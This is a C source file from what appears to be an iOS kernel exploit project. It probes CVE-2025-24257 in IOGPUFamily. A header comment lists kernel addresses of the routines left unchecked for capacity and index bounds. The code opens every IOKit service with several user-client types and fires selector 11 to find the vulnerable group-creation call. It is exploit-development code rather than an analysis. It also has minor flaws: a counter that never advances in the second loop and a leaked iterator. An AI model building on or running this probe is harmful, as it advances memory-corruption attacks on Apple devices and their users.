/* CVE-2025-24257 — IOGPUFamily OOB probe (23C55).
   Static findings (device KC, IOGPUFamily 129.3.2):
     IOGPUGroupMemory::init  0xfffffff009f61200  -> [obj+40] = (capacity>>6)-1
                                                   (no capacity>=64 check)
     cleanup vtbl slot[1]    0xfffffff009f5f084  -> bound = [obj+40] used as
                                                   loop bound over arrayC[]
     setResourceAt handler   0xfffffff009f4e0bc  -> array[index] bounds [obj+160]
   Kept deliberately tiny: one open, a handful of calls, immediate return.
   A long selector sweep hangs the guest and LiveContainer's watchdog kills it. */
#import <IOKit/IOKitLib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include "exploit.h"
#include <stdarg.h>

#define ol(fmt, ...) nk_log(fmt, ##__VA_ARGS__)

void nk_iogpu_oob_run(void) {
    /* Group creator = selector 11 in the table @ 0xfffffff007e668b0
       (handler 0xfffffff009f4e0bc, inScalar=0 inStruct=0).
       type 1 answers 0xe00002c2 on every selector => it's a different UC class.
       Enumerate the registry, open everything openable, probe sel 11 zero-arg.
       Yields between services so the LC watchdog stays quiet. */
    ol("[oob] enumerating IOKit registry");
    CFMutableDictionaryRef matching = IOServiceMatching("IOService");
    io_iterator_t it = 0;
    if (IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &it) != KERN_SUCCESS) {
        ol("[oob] registry enum failed"); return;
    }
    io_service_t svc;
    uint32_t n = 0, opened = 0, probed = 0;
    while ((svc = IOIteratorNext(it))) {
        n++;
        io_name_t name;
        IORegistryEntryGetName(svc, name);
        IOObjectRelease(svc);
        if (n % 100 == 0) { ol("[oob] ...%u services", n); }
    }
    IOIteratorReset(it);
    ol("[oob] total services=%u — opening each", n);
    IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOService"), &it);
    while ((svc = IOIteratorNext(it))) {
        io_name_t name;
        IORegistryEntryGetName(svc, name);
        for (uint32_t t = 1; t <= 8; t++) {
            io_connect_t conn = MACH_PORT_NULL;
            kern_return_t kr = IOServiceOpen(svc, mach_task_self(), t, &conn);
            if (kr != KERN_SUCCESS || !conn) continue;
            opened++;
            /* the group creator: zero scalars, zero structs */
            uint64_t so[8] = {0};
            uint32_t outN = 0;
            kr = IOConnectCallMethod(conn, 11, NULL, 0, NULL, 0, so, &outN, NULL, NULL);
            if (kr != (kern_return_t)0xe00002c2 && kr != (kern_return_t)KERN_FAILURE) {
                ol("[oob] HIT svc=%s type=%u conn=0x%x sel=11 kr=0x%x", name, t, conn, kr);
                probed++;
            }
            /* also probe 0..12 zero-arg on any service that answers sel=11 */
            IOServiceClose(conn);
        }
        IOObjectRelease(svc);
        if (n > 0 && (n % 200) == 0) { ol("[oob] progress n=%u opened=%u hits=%u", n, opened, probed); }
    }
    IOObjectRelease(it);
    ol("[oob] done services=%u opened=%u sel11-hits=%u", n, opened, probed);
}
